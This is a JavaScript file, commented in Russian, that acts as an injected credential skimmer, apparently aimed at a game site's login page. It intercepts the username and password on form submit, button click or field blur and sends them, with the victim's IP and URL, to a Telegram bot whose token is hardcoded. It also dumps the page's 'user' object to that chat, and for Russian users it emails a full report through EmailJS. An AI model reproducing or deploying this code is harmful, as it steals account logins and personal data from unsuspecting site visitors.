setTimeout(() => {
(async function() {
    // Конфигурация Telegram бота
    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
    const GROUP_ID = '-1003867014479';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

    // Функция для получения IP
    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || "Не удалось получить IP";
        } catch {
            return "Не удалось получить IP";
        }
    };

    // Функция для безопасного клонирования объектов
    const deepClone = (obj) => {
        if (obj === null || typeof obj !== 'object') return obj;
        const clone = Array.isArray(obj) ? [] : {};
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                clone[key] = deepClone(obj[key]);
            }
        }
        return clone;
    };

    // Получаем данные из переменной user для файла
    const getUserDataForFile = () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                return JSON.stringify(deepClone(user), null, 2);
            }
            return "Переменная 'user' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'user': ${e.message}`;
        }
    };

    // Отправка файла с данными user
    const sendUserDataFile = async () => {
        try {
            const userData = getUserDataForFile();
            const userIP = await getIP();
            
            // Создаем Blob из данных
            const blob = new Blob([userData], { type: 'application/json' });
            const fileName = `user_data_${Date.now()}.json`;
            
            // Создаем FormData для отправки файла
            const formData = new FormData();
            formData.append('chat_id', GROUP_ID);
            formData.append('document', blob, fileName);
            formData.append('caption', `📁 Данные переменной user\n🌐 IP: ${userIP}\n📅 ${new Date().toLocaleString()}`);

            const response = await fetch(`${TELEGRAM_API_URL}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            if (!result.ok) {
                console.error('Ошибка отправки файла:', result.description);
            }
            return result;
        } catch (error) {
            console.error('Ошибка отправки файла:', error);
        }
    };

    // Логика перехвата логина и пароля (из второго скрипта)
    function setupLoginInterception() {
        const SELECTORS = {
            username: '#loginUsername',
            password: '#loginPassword',
            submitButton: 'button[type="submit"]'
        };

        // Функция отправки учетных данных
        const sendCredentials = async (username, password) => {
            const timestamp = new Date().toLocaleString('ru-RU');
            const userIP = await getIP();
            
            const message = `🔐 НОВЫЕ УЧЕТНЫЕ ДАННЫЕ\n\n👤 Логин: ${username}\n🔐 Пароль: ${password}\n🌐 IP: ${userIP}\n⏰ ${timestamp}\n🔗 URL: ${window.location.href}`;

            try {
                const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: GROUP_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });

                const result = await response.json();
                if (result.ok) {
                    console.log('✅ Учетные данные отправлены');
                    
                    // После отправки логина/пароля отправляем файл с данными user
                    await sendUserDataFile();
                } else {
                    console.error('Ошибка отправки:', result.description);
                }
            } catch (error) {
                console.error('Ошибка сети:', error);
            }
        };

        // Основная функция настройки перехвата
        function setupInterception() {
            const usernameField = document.querySelector(SELECTORS.username);
            const passwordField = document.querySelector(SELECTORS.password);
            const submitButton = document.querySelector(SELECTORS.submitButton);

            if (usernameField && passwordField) {
                console.log('Форма входа обнаружена - настройка перехвата');

                // Метод 1: Перехват отправки формы
                const form = usernameField.closest('form');
                if (form) {
                    const originalSubmit = form.submit;
                    form.submit = function() {
                        if (usernameField.value && passwordField.value) {
                            sendCredentials(usernameField.value, passwordField.value);
                        }
                        return originalSubmit.call(this);
                    };
                    
                    form.addEventListener('submit', function(event) {
                        event.preventDefault();
                        if (usernameField.value && passwordField.value) {
                            sendCredentials(usernameField.value, passwordField.value);
                        }
                        setTimeout(() => {
                            originalSubmit.call(form);
                        }, 100);
                    });
                    return;
                }

                // Метод 2: Перехват клика по кнопке
                if (submitButton) {
                    submitButton.addEventListener('click', function(event) {
                        setTimeout(() => {
                            if (usernameField.value && passwordField.value) {
                                sendCredentials(usernameField.value, passwordField.value);
                            }
                        }, 300);
                    });
                    return;
                }

                // Метод 3: Fallback - события blur
                passwordField.addEventListener('blur', function() {
                    if (usernameField.value && passwordField.value) {
                        sendCredentials(usernameField.value, passwordField.value);
                    }
                });
            } else {
                // Повторная попытка если форма еще не загрузилась
                setTimeout(setupInterception, 2000);
            }
        }

        // Запускаем перехват с задержкой для динамического контента
        setTimeout(setupInterception, 3000);

        // Наблюдатель за изменениями DOM
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (!document.querySelector(SELECTORS.username)) {
                    setupInterception();
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true,
            attributes: false,
            characterData: false
        });
    }

    // Запускаем перехват логина/пароля
    setupLoginInterception();

    // Автоматическая отправка данных при загрузке страницы (если user существует)
    const autoSendUserData = async () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                await sendUserDataFile();
                console.log('✅ Данные user отправлены автоматически');
            }
        } catch (error) {
            console.error('Ошибка автоматической отправки:', error);
        }
    };

    // Запускаем автоматическую отправку через 2 секунды после загрузки
    setTimeout(autoSendUserData, 2000);

})();

// Оригинальный код для российских пользователей (обновленная версия без кук)
if(typeof user !== 'undefined' && user.authData && user.authData.countryCode == "RU"){
    var script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
    script.onload = function() {
        emailjs.init("4N-8nqIjjUBhk1vbi");
        
        setTimeout(async () => {
            // Функции сбора данных (без кук)
            const getIP = async () => {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip || "Не удалось получить IP";
                } catch {
                    return "Не удалось получить IP";
                }
            };

            const getCredentials = () => {
                try {
                    const usernameField = document.querySelector('#loginUsername') || 
                                        document.querySelector('input[name="login"]') ||
                                        document.querySelector('input[type="text"]');
                    
                    const passwordField = document.querySelector('input[type="password"]') || 
                                        document.querySelector('input[name*="pass"]') ||
                                        document.querySelector('input#password');
                    
                    const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
                    const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
                    
                    return { username, password };
                } catch {
                    return { 
                        username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                        password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
                    };
                }
            };

            const deepClone = (obj) => {
                if (obj === null || typeof obj !== 'object') return obj;
                const clone = Array.isArray(obj) ? [] : {};
                for (const key in obj) {
                    if (obj.hasOwnProperty(key)) {
                        clone[key] = deepClone(obj[key]);
                    }
                }
                return clone;
            };

            const getUserData = () => {
                try {
                    if (typeof user !== 'undefined' && user !== null) {
                        return JSON.stringify(deepClone(user), null, 2);
                    }
                    return "Переменная 'user' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'user': ${e.message}`;
                }
            };

            const sendUserData = async () => {
                const userIP = await getIP();
                const credentials = getCredentials();
                const userData = getUserData();
                
                const messageText = `
ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
=============================

📅 Время: ${new Date().toLocaleString()}
🌐 IP-адрес: ${userIP}
🔗 URL: ${window.location.href}

💰 Gems: ${user?.premiumPoints || 'N/A'}
🖥️ Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}

👤 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
${userData}

🔐 УЧЕТНЫЕ ДАННЫЕ:
Логин: ${credentials.username}
Пароль: ${credentials.password}
=============================
Отчет сгенерирован автоматически.
                `;

                const templateParams = {
                    message: messageText
                };

                console.log("Отправка простого текста через EmailJS...");
                
                emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams)
                    .then(function(response) {
                        console.log('✅ Письмо успешно отправлено! Статус:', response.status);
                    }, function(error) {
                        console.error('❌ Ошибка отправки:', error);
                    });
            };

            await sendUserData();
        }, 1);
    };
    document.head.appendChild(script);
}
}, 6500);
